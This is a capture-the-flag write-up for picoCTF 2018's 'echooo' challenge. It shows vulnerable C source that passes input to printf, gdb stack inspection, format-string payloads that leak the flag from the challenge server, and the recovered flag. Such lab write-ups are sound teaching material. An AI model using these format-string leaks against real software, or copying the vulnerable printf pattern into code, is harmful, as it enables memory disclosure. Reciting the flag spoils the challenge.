# [echooo](https://2018game.picoctf.com/problems)

## Problem
This program prints any input you give it. Can you [leak](https://2018shell3.picoctf.com/static/802110a231267eb07cdead16416dea12/echo) the flag? Connect with nc 2018shell3.picoctf.com 23397. [Source](https://2018shell3.picoctf.com/static/802110a231267eb07cdead16416dea12/echo.c).

## Solution

here's the source code

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");

  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

let's open the executable locally with gdb and have a look at the stack before the format string gets executed

```
——> gdb echo
Reading symbols from echo...(no debugging symbols found)...done.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080485fb <+0>:	lea    ecx,[esp+0x4]
[..]
0x080486ff <+260>:	call   0x8048490 <exit@plt>
0x08048704 <+265>:	sub    esp,0x4
0x08048707 <+268>:	push   DWORD PTR [ebp-0x90]
0x0804870d <+274>:	push   0x40
0x0804870f <+276>:	lea    eax,[ebp-0x4c]
0x08048712 <+279>:	push   eax
0x08048713 <+280>:	call   0x8048460 <fgets@plt> <-- fgets(flag, sizeof(flag), file);
0x08048718 <+285>:	add    esp,0x10
[..]
0x08048742 <+327>:	add    esp,0x10
0x08048745 <+330>:	sub    esp,0xc
0x08048748 <+333>:	lea    eax,[ebp-0x8c]
0x0804874e <+339>:	push   eax
0x0804874f <+340>:	call   0x8048450 <printf@plt>
0x08048754 <+345>:	add    esp,0x10
0x08048757 <+348>:	jmp    0x804871b <main+288>
End of assembler dump.
gdb-peda$ b *0x0804874f
Breakpoint 1 at 0x804874f
gdb-peda$ r
Starting program: /home/andrei/Documents/pico/echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> AAAABBBB
Breakpoint 1, 0x0804874f in main ()
gdb-peda$
```

looking at the disassembly of main we can also get the address of the ```flag``` variable; the call to the fgets that reads the flag.txt file is at main+280, and just before that the flag buffer is pushed on the stack from eax to pass it as argument. the address is loaded on eax the line before with ```lea    eax,[ebp-0x4c]``` so there's our buffer:

```
gdb-peda$ x/wx $ebp-0x4c
0xffffd8fc:	0x6f636970
```

and here's the stack prior to the printf

```
gdb-peda$ x/64wx $esp
0xffffd890:	0xffffd8bc	0x00000040	0xf7f95580	0x08048647
0xffffd8a0:	0xf7ffc8e4	0xf63d4e2e	0xf7ffdacc	0xffffd9f4
0xffffd8b0:	0xffffd8fc	0x000003e8	0x0804b160	0x41414141
0xffffd8c0:	0x42424242	0x0000000a	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8f0:	0x00000000	0x00000000	0x00000000	0x6f636970
0xffffd900:	0x7b465443	0x6b6e6166	0x7d6f6c75	0xf7f9000a
0xffffd910:	0xf7f94e24	0xf7f94e24	0x00000000	0xf7dedafb
0xffffd920:	0xf7f953bc	0x00040000	0x00000003	0x080487ab
0xffffd930:	0x00000001	0xffffd9f4	0xffffd9fc	0x0fec1a00
0xffffd940:	0xf7fe4150	0xffffd960	0x00000000	0xf7dd6b41
0xffffd950:	0xf7f94e24	0xf7f94e24	0x00000000	0xf7dd6b41
0xffffd960:	0x00000001	0xffffd9f4	0xffffd9fc	0xffffd984
0xffffd970:	0x00000001	0x00000000	0xf7f94e24	0xffffffff
0xffffd980:	0xf7ffcfb4	0x00000000	0xf7f94e24	0xf7f94e24
```

so our input begins at 0xffffd8bc and the flag begins at 0xffffd8fc;
also the flag buf is the 27th word on the stack, we can check that with the format string:

```
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> 0x%27$08x
0x6f636970
```

bingo. now we just need to read the flag. after ```nc```ing on the server we try to read the flag string:

```
——> nc 2018shell3.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %27s
timeout: the monitored command dumped core
```

but that leads to core dump. so we can read the words and translate them to string locally

```
——> nc 2018shell3.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> 0x%27$08x_0x%28$08x_0x%29$08x_0x%30$08x_0x%31$08x_0x%32$08x_
0x6f636970_0x7b465443_0x6d526f66_0x735f7434_0x6e695274_0x615f7347_
```

after we have all the words we can write a C program to read the flag:

```
#include <stdio.h>

int main(void) {

	int s[] = {0x6f636970, 0x7b465443, 0x6d526f66, 0x735f7434,
  			0x6e695274, 0x615f7347, 0x445f6552, 0x65476e61,
  			0x73753072, 0x3435325f, 0x61383431, 0x000a7d65,
  			0x080487ab, 0x00000001, 0x00};

	printf("%s\n", (char *) s);

	return 0;
}
```

```
——> gcc -m32 decode.c -o decode
——> ./decode
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}
```
